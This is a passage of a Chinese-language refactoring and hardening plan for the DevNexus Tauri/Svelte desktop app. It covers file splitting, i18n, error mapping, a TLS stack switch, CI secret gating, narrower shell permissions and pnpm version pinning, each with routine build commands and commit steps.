先抽 `software_data.rs`（`build_software_defs`、`map_package_name`、`GUI_APPS`、`get_download_url` 静态表），再抽 `software_pm.rs`（各包管理器的 install/uninstall/版本查询执行体），`software.rs` 保留命令编排与公共校验（含 S5/S6 修复）。software 22 个既有测试必须全过。拆分为多个小提交（每拆一块提交一次），便于回滚。

- [ ] **Step 4: 验证**

每步拆分后：

```bash
cargo check --manifest-path src-tauri/Cargo.toml && cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 每步全绿后再提交。

- [ ] **Step 5: Commit（每块独立提交）**

```bash
git add -A
git commit -m "refactor: 拆分 mirror/cookie_extractor/software 巨型文件 (A5)"
```

### Task 3.6：Phase 3 收尾验证

- [ ] **Step 1: 全量验证 + 行为回归**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && \
cargo test --manifest-path src-tauri/Cargo.toml && \
./node_modules/.bin/svelte-check
```
Expected: 全部通过（测试数不低于 Phase 2 结束时）。

- [ ] **Step 2: 确认 A1-A5 全部落地**

逐项核对：A1 统一执行器、A2 rc_editor、A3 路径表单一数据源、A4 统一错误类型、A5 巨型文件拆分。任何一项未落地则补做。

---

## Phase 4：前端重构

**目标：** 修复前端审查发现的问题：ApiHub 完全未走 i18n、巨型组件、死代码（Phase 0 已删 downloads/*）、ConfirmDialog 丢标题、全局搜索跨页污染、错误透出无归一化、ErrorBoundary 轮询、DownloadManager 每秒全量重建（该页面 Phase 0 已删，对应任务移除）。验证命令：`./node_modules/.bin/svelte-check`（0 errors）。

### Task 4.1：ApiHub.svelte 完整 i18n 化

**Files:**
- Modify: `src/routes/ApiHub.svelte`（669 行，脚本 ~40 处 + 模板 60+ 处硬编码中文）
- Modify: `src/locales/zh.json` / `en.json` / `ru.json`（新增 `apiHub` 顶层块）

**问题：** 整个页面不 import `t`，`protocolOptions`/`tabs`/`metricCards` 全部写死中文；zh.json 无任何 api_hub 键（已核实）。

- [ ] **Step 1: 补全三语 locale 键**

在 zh/en/ru 三个 locale 文件新增 `apiHub` 块，覆盖页面全部文案：`title`（聚合网关）、`tabs.usage/logs/providers`、`addProvider`/`editProvider`、`protocol.*`（OpenAI/Anthropic/Responses）、`models`、`status.*`、`toast.updated/added/deleted`、`errors.*`（含"请至少选择一个模型"）、`metrics.*`（请求数/token/延迟）、`empty.*` 等。中文值沿用现有硬编码文案，英文/俄文翻译参考其他模块风格。

- [ ] **Step 2: 脚本内文案改为 t()**

在 `<script>` 顶部 `import { t } from "../lib/i18n.svelte.js";`（或项目现有 i18n 引入方式），将脚本中约 40 处硬编码中文（toast 消息、错误提示、选项标签）全部替换为 `t("apiHub.xxx")`。`protocolOptions`/`tabs`/`metricCards` 等数组改为 `$derived`（引用 `t()`，保证切语言刷新——参考 Phase 4 Task 4.5 的 `$derived` 模式）。

- [ ] **Step 3: 模板内文案改为 t()**

将模板中 60+ 处中文替换为 `{t("apiHub.xxx")}`。`placeholder`、`aria-label` 一并覆盖。

- [ ] **Step 4: 验证**

```bash
./node_modules/.bin/svelte-check
```
Expected: 0 errors。手动（或通过测试）确认 ApiHub 页面无残留硬编码中文：`grep -n '[\u4e00-\u9fff]' src/routes/ApiHub.svelte` 仅剩注释。

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "refactor: ApiHub 页面完整 i18n 化 (F1)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 4.2：巨型组件拆分

**Files:**
- Create: `src/components/hub/ProviderForm.svelte`、`src/components/hub/ModelList.svelte`
- Modify: `src/routes/ApiHub.svelte`（669 行 → 拆分后 <400 行）
- Modify: `src/routes/ContainerManager.svelte`（1004 行）、`src/routes/PasswordManager.svelte`（592 行）

**问题：** ApiHub 中"添加/编辑 Provider 表单"与模型列表两处重复实现（约 150 行重复）；ContainerManager 5 个 tab + 6 个自绘弹窗；PasswordManager 3 个弹窗。

- [ ] **Step 1: 抽取 ProviderForm 组件**

将 ApiHub.svelte 第 342-500 行（添加 Provider 表单）与第 506-601 行（编辑表单）的重复部分抽为 `ProviderForm.svelte`（props：`provider`（编辑时为对象，新增为 null）、`protocolOptions`；events：`submit`）。两处调用点改为 `<ProviderForm ...>`。

- [ ] **Step 2: 抽取 ModelList 组件**

将模型列表展示（含启用开关、模型计数）抽为 `ModelList.svelte`。

- [ ] **Step 3: ContainerManager / PasswordManager 弹窗抽取**

ContainerManager 的 6 个自绘弹窗（第 807-1004 行）按类型合并抽取（如 `ContainerDialog.svelte` + 配置对象驱动），PasswordManager 的 3 个弹窗（第 459-592 行）抽取为通用 `VaultDialog.svelte` 或按职责拆分。保持行为不变。

- [ ] **Step 4: 验证**

```bash
./node_modules/.bin/svelte-check
```
Expected: 0 errors。路由功能不变（可在 `pnpm tauri dev` 中抽查，但不强制）。

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "refactor: 拆分 ApiHub/ContainerManager/PasswordManager 巨型组件 (F2)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 4.3：错误归一化层

**Files:**
- Create: `src/lib/errors.svelte.js`（统一错误映射）
- Modify: `src/routes/*.svelte`（ContainerManager:116、ApiHub:92、MirrorSettings:66 等 `err.message || String(err)` 直接透出点）

**问题：** 后端英文/内部错误原样透出给用户（`err.message || String(err)`），无本地化层；部分错误是字符串而非对象（`String(err)` 分支）。

- [ ] **Step 1: 建立错误映射模块**

```js
// src/lib/errors.svelte.js
import { t } from "./i18n.svelte.js";

export function friendlyError(err) {
  const msg = typeof err === "string" ? err : err?.message || String(err);
  // 精确匹配已知错误 → 本地化文案；未知 → 返回原文（保底可读性）
  const known = {
    "vault is locked": t("errors.vault_locked"),
    "Provider already exists": t("errors.provider_exists"),
  };
  for (const [pattern, label] of Object.entries(known)) {
    if (msg.includes(pattern)) return label;
  }
  return msg;
}
```

同时为 `errors.vault_locked`/`errors.provider_exists` 等在三语 locale 补充键（与 A4 的后端 `DevNexusError` 文案对齐）。

- [ ] **Step 2: 替换透出点**

将各路由中 `showToast(err.message)`/`showToast(String(err))` 的调用替换为 `showToast(friendlyError(err))`。以 `search_replace` 批量替换后逐个检查语义（toast 直接传错误、弹窗错误区传错误等）。

- [ ] **Step 3: 验证**

```bash
./node_modules/.bin/svelte-check
```
Expected: 0 errors。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "refactor: 前端错误归一化层，透出本地化文案 (F3)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 4.4：全局搜索跨页污染与 ErrorBoundary 响应式

**Files:**
- Modify: `src/lib/stores.svelte.js`（`searchQuery`）
- Modify: `src/components/ErrorBoundary.svelte:48`（500ms setInterval 轮询）
- Modify: `src/lib/error.svelte.js:29-34`（死 API）

**问题：** `searchQuery` 被 ContainerManager/ProcessManager/AppUninstaller 共用，切路由后残留关键词；ErrorBoundary 用轮询替代响应式，`errorStore.subscribe` 只回调一次是死代码（已核实）。

- [ ] **Step 1: searchQuery 改为路由内私有**

将 `searchQuery` 从全局 store 移除，改为各使用页（ContainerManager/ProcessManager/AppUninstaller）内部 `$state`。若某页确实需要跨页共享（如全局搜索框），改为在 Sidebar/App 层持有并通过 props 下发，否则全部私有化。

- [ ] **Step 2: ErrorBoundary 改为响应式**

删除 `setInterval` 轮询，改为 `$effect` 订阅错误 store 或 `$derived` 读取：

```svelte
<script>
  import { getError } from "../lib/error.svelte.js";
  let { children } = $props();
  let error = $state(null);
  $effect(() => {
    error = getError();
  });
</script>
```

删除 `error.svelte.js` 中 `subscribe` 死代码，保留 `getError`/`setError`（按实际实现调整）。

- [ ] **Step 3: 验证**

```bash
./node_modules/.bin/svelte-check
```
Expected: 0 errors。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "refactor: 搜索状态私有化 + ErrorBoundary 响应式化 (F4)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 4.5：ConfirmDialog 标题与切语言刷新

**Files:**
- Modify: `src/components/ConfirmDialog.svelte:8-31`（只渲染 message 不渲染 title）
- Modify: `src/lib/confirm.svelte.js:11`（已存 title）
- Modify: `src/routes/ContainerManager.svelte:76-82`、`SoftwareCenter.svelte:22-29`、`MirrorSettings.svelte:14-22`、`ApiHub.svelte:168-179`（tabs/categories 数组初始化时一次性调 t()）

**问题：** `showConfirm(msg, title)` 传入的标题从不显示（已核实）；tabs/categories 数组在模块初始化时调一次 `t()`，同页切语言不刷新（当前靠路由重挂载掩盖）。

- [ ] **Step 1: ConfirmDialog 渲染 title**

在 ConfirmDialog 模板中，若 `confirm.title` 存在则渲染标题（与 message 样式区分），否则只渲染 message。同步确认 `confirm.svelte.js` 的 `showConfirm` 签名透传 title。

- [ ] **Step 2: 数组改为 $derived**

将 ContainerManager/SoftwareCenter/MirrorSettings/ApiHub 中初始化时调 `t()` 的数组改为 `$derived`（`$derived.by(() => [...])`），使切语言时重新计算。

- [ ] **Step 3: 验证**

```bash
./node_modules/.bin/svelte-check
```
Expected: 0 errors。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "refactor: ConfirmDialog 渲染标题 + 数组切语言响应式刷新 (F5)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 4.6：其余页面硬编码文案清理

**Files:**
- Modify: `src/routes/Dashboard.svelte:101-175`（"System status at a glance"/"CPU Cores"/"Version"/"No environments"）
- Modify: `src/routes/AppUninstaller.svelte`（英文 toast :47,75,97,178、"共" :362、`.replace(/\d+/,"")` 抠数字 :359）
- Modify: `src/routes/CookieExtractor.svelte:209`（中文提示）
- Modify: `src/components/TitleBar.svelte:22-41`（中文 aria-label）
- Modify: `src/routes/EnvironmentManager.svelte:165,182-185`（英文文案）
- Modify: `src/locales/zh.json` / `en.json` / `ru.json`

**问题（自检补充）：** 除 ApiHub 外，Dashboard/AppUninstaller/CookieExtractor/TitleBar/EnvironmentManager 仍有硬编码文案；`AppUninstaller:359` 用 `.replace(/\d+/,"")` 从翻译串抠数字（脆且破坏 i18n）。

- [ ] **Step 1: 补 locale 键并替换文案**

为上述页面新增/复用 locale 键（zh/en/ru 三语），替换硬编码字符串。`AppUninstaller:359` 的抠数字逻辑改为 i18n 参数化（如 `t("appUninstaller.total", { n })`，svelte i18n 若支持插值；否则改为后端返回纯数字 + 前端 `t()` 拼装）。

- [ ] **Step 2: 验证**

```bash
./node_modules/.bin/svelte-check
grep -rn '[\u4e00-\u9fff]' src/routes/Dashboard.svelte src/routes/AppUninstaller.svelte src/components/TitleBar.svelte | head
```
Expected: 0 errors；grep 仅剩注释。

- [ ] **Step 3: Commit**

```bash
git add -A
git commit -m "refactor: 清理 Dashboard/AppUninstaller 等页面硬编码文案 (F6)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 4.7：Phase 4 收尾验证

- [ ] **Step 1: 全量验证**

```bash
./node_modules/.bin/svelte-check && \
cargo check --manifest-path src-tauri/Cargo.toml && \
cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 全部通过。

- [ ] **Step 2: 确认 F1-F5 全部落地**

逐项核对：F1 ApiHub i18n、F2 组件拆分、F3 错误归一化、F4 搜索私有化+响应式、F5 标题渲染+切语言刷新。任何一项未落地则补做。

---

## Phase 5：工程与 CI 加固

**目标：** 修复工程配置问题：双 TLS 栈、gitignore 缺失、过期 Cargo.lock、CI 密钥/矩阵、release-cleanup 误删风险、`withGlobalTauri` 与 capabilities 过宽、pnpm 工具链问题。验证命令同前。

### Task 5.1：统一 TLS 栈为 rustls

**Files:**
- Modify: `src-tauri/Cargo.toml:28`（`reqwest` features：`native-tls` → `rustls-tls`）

**问题：** reqwest 0.12 用 native-tls，与 tauri 核心/updater 引入的 reqwest（rustls）并存 → 双 TLS 栈，体积与攻击面翻倍（已核实 Cargo.toml）。

- [ ] **Step 1: 切换 reqwest 到 rustls**

```toml
reqwest = { version = "0.12", default-features = false, features = ["json", "stream", "rustls-tls"] }
```

- [ ] **Step 2: 更新下载模块残留引用（如 Phase 0 未清理完）**

检查 `src-tauri/src` 中是否有 `native-tls` 直接引用（Phase 0 已删 download 模块后应无残留），`cargo check` 确认。

- [ ] **Step 3: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 编译通过（rustls 可能首次拉取依赖），测试全绿。确认 `cargo tree -d` 不再出现双 TLS 栈（`cargo tree --manifest-path src-tauri/Cargo.toml -i native-tls` 无结果）。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "build: 统一 TLS 栈为 rustls，移除 native-tls (E1)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 5.2：gitignore 补全与过期 Cargo.lock 清理

**Files:**
- Modify: `.gitignore`
- Delete: `src-tauri/Cargo.lock`（过期，锁着已删除的 cron/hmac/portable-pty 依赖；workspace 锁在根 Cargo.lock）

**问题：** `.gitignore` 缺 `.qoder/`、`.agent-cache/`（工作区已存在，污染 git status）；`src-tauri/Cargo.lock` 过期（已核实）。

- [ ] **Step 1: 补全 .gitignore**

在 "Agent caches" 段追加：

```gitignore
.qoder/
.agent-cache/
.omo/
```

（`.omo/` 已存在但位于文件末尾，合并到 Agent caches 段或保留均可；确保 `.qoder/` 与 `.agent-cache/` 被忽略。）

- [ ] **Step 2: 删除过期锁文件**

```bash
git rm src-tauri/Cargo.lock
```

确认根 `Cargo.lock` 已包含全部依赖（`cargo check --manifest-path src-tauri/Cargo.toml` 会更新根锁文件，提交其变更）。

- [ ] **Step 3: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml
git status --short
```
Expected: 编译通过；`git status` 不再显示 `.qoder/`、`.agent-cache/`；无 `src-tauri/Cargo.lock` 残留。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "chore: 补全 gitignore 并删除过期 src-tauri/Cargo.lock (E2)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 5.3：CI 加固 — 密钥策略、矩阵与缓存

**Files:**
- Modify: `.github/workflows/build.yml`
- Modify: `.github/workflows/release-cleanup.yml`

**问题：** build.yml 用 `secrets... || ''`，fork/PR 构建无密钥时签名必失败（已核实）；非统一矩阵（Linux 仅 x86_64 无 arm64）；`brew install create-dmg || true` 掩盖失败；无 pnpm store/apt 缓存；release-cleanup.yml 无条件删旧 release/tag，无仓库/前缀过滤（误删风险）。

- [ ] **Step 1: 密钥仅在 main/标签构建注入**

将 build.yml 中 updater 签名密钥注入改为条件步骤：仅当 `github.event_name == 'push' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/'))` 时设置 `TAURI_SIGNING_PRIVATE_KEY`/`TAURI_SIGNING_PRIVATE_KEY_PASSWORD`，其余构建跳过 updater 打包（`TAURI_BUNDLE_UPDATER=false` 或条件步骤）。确保 fork/PR 构建不因空密钥失败。

- [ ] **Step 2: 矩阵补齐与缓存**

将三平台矩阵统一（Windows/macOS/Linux × x86_64，Linux 增加 arm64 视 runner 可用性）；添加 `pnpm/action-setup` + `pnpm store` 缓存、apt 缓存（Linux）。`create-dmg || true` 改为检查产物存在性（失败时告警而非静默）。

- [ ] **Step 3: release-cleanup.yml 加过滤**

在删除旧 release/tag 前校验：仓库为预期仓库（`github.repository == 'linanwanttodo/DevNexus'`）+ 仅清理 `latest` 之前的版本 + 标签名匹配版本格式（`v*`/数字版本）。保留 keep=3 策略，但任何删除前二次断言仓库/前缀。

- [ ] **Step 4: 验证**

本地无法完整跑 CI；验证方式：`git diff` 复核 workflow 语法（YAML 解析：`ruby -e 'require "yaml"; YAML.load_file(".github/workflows/build.yml"); puts "ok"'` 或等效），并在 PR 中观察 CI 结果。

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "ci: 加固密钥注入策略、构建矩阵与 release 清理过滤 (E3)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 5.4：tauri 配置收紧 — withGlobalTauri 与 capabilities

**Files:**
- Modify: `src-tauri/tauri.conf.json:13`（`withGlobalTauri`）
- Modify: `src-tauri/capabilities/default.json`（`shell:allow-open` 过宽）

**问题：** `withGlobalTauri: true` 暴露 `window.__TAURI__`（前端已显式 import，无需全局注入）；capabilities `shell:allow-open` 允许打开任意 URL（已核实）。

- [ ] **Step 1: 关闭 withGlobalTauri**

```json
"withGlobalTauri": false
```

确认前端无 `window.__TAURI__` 全局访问（全部走 `import { ... } from "@tauri-apps/api"`），`svelte-check` + 运行时验证（若 dev 模式正常则构建也正常）。

- [ ] **Step 2: 收紧 shell:allow-open**

将 `shell:allow-open` 替换为受限 scope（若项目只用 `open` 打开本地文件/下载目录，允许 `$HOME/**` 与白名单 URL 前缀；若已不再需要则移除该权限）。在 capabilities 中使用 scope 语法：

```json
{
  "identifier": "shell:allow-open",
  "allow": [{ "url": "https://*.github.com/**" }, { "path": "$HOME/**" }]
}
```

实现时按实际用途（Settings 页打开更新页、各页打开文件路径）收窄；无法确定用途时，优先移除并让使用点走 `dialog`/`opener` 插件。

- [ ] **Step 3: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && ./node_modules/.bin/svelte-check
```
Expected: 编译通过、0 errors。运行时权限问题需在 `pnpm tauri dev` 抽查（若涉及打开文件/URL 的功能点）。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "chore: 关闭 withGlobalTauri 并收紧 shell open 权限 (E4)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 5.5：pnpm 工具链与版本锁定

**Files:**
- Modify: `package.json`（新增 `packageManager`、`engines`）
- Modify: `pnpm-workspace.yaml` 或 `package.json` 的 `pnpm` 字段（`allowBuilds` → `onlyBuiltDependencies`，修复 esbuild 构建脚本拦截）

**问题：** 无 `packageManager`/`engines`，CI 硬编码 pnpm@9/Node22 与本地不受约束；pnpm 11 拦截 esbuild 构建脚本导致 `pnpm check`/`pnpm install` 非 TTY 失败（已实测复现）。

- [ ] **Step 1: 版本锁定**

```json
"engines": { "node": ">=20", "pnpm": ">=9" },
"packageManager": "pnpm@9.15.0"
```

（以 CI 现有版本为准，保证 CI 与本地一致。）

- [ ] **Step 2: 批准 esbuild 构建脚本**

在 `package.json` 添加 pnpm 配置（pnpm 11 字段；若项目用 `pnpm-workspace.yaml` 配置则放那里）：

```json
"pnpm": {
  "onlyBuiltDependencies": ["esbuild"]
}
```

- [ ] **Step 3: 验证**

```bash
CI=true pnpm check
```
Expected: 不再报 `ERR_PNPM_IGNORED_BUILDS`，svelte-check 正常执行（0 errors）。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "chore: 锁定包管理器版本并修复 esbuild 构建脚本拦截 (E5)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 5.6：Phase 5 收尾验证

- [ ] **Step 1: 全量验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && \
cargo test --manifest-path src-tauri/Cargo.toml && \
./node_modules/.bin/svelte-check
```
Expected: 全部通过。

- [ ] **Step 2: 确认 E1-E5 全部落地**

逐项核对：E1 rustls 统一、E2 gitignore+锁文件、E3 CI 加固、E4 tauri 配置收紧、E5 pnpm 工具链。任何一项未落地则补做。

---

## 全计划交付检查

- [ ] **Step 1: 端到端验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && \
cargo test --manifest-path src-tauri/Cargo.toml && \
./node_modules/.bin/svelte-check
```

- [ ] **Step 2: 六个阶段全部落地确认**

Phase 0 下载移除 → Phase 1 安全 S1-S10（含 S10 Cookie 临时文件）→ Phase 2 正确性 C1-C9（含 C8 join_path、C9 fetch_models）→ Phase 3 架构 A1-A5 → Phase 4 前端 F1-F6 → Phase 5 工程 E1-E5。任一缺口回到对应 Task 补做。低优延后项：api_key 加密存储（C6 已打码，加密存储可延后）、PBKDF2 默认迭代数提升（Task 1.8 自检补充）。

- [ ] **Step 3: 审查报告逐条销号**

对照审查报告（安全 S1-S9 / 正确性 / 架构 / 前端 / 工程）逐条确认已修复或已在计划中显式记录为延后项（如 api_key 加密存储），在 `docs/superpowers/plans/` 同目录追加一份 `2026-07-31-fix-and-remove-download-status.md` 销号清单（可选但推荐）。
